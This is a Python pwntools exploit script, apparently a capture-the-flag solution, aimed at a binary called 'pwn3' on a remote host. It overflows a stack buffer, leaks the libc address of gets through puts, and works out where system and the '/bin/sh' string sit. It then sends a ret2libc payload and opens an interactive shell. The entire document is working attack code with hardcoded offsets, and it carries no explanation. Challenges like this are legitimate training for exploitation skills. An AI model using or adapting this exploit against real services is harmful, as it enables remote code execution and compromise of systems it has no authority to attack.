#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
	p = process('./pwn3')
else:
	p = remote('104.154.106.182', 4567)
elf = ELF('./pwn3')
main = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
gets_got = elf.got['gets']
# gdb.attach(p)
# payload = cyclic(500)
offset = 140
payload = 'A' * offset + p32(puts_plt) + p32(main) + p32(gets_got)
p.recvuntil('desert: \n')
p.sendline(payload)
gets = u32(p.recv(4))
success('gets = ' + hex(gets))
raw_input('@')
libc_base = gets - 0x064e60 # 0x05fae0
success('libc_base = ' + hex(libc_base))
system = libc_base + 0x040310 # 0x03b060
str_bin_sh = libc_base + 0x162d4c # 0x15f84f
success('system = ' + hex(system))
success('str_bin_sh = ' + hex(str_bin_sh))
payload = 'A' * (offset - 8) + p32(system) + p32(0x12345678) + p32(str_bin_sh)
p.recvuntil('desert: \n')
p.sendline(payload)
p.interactive()
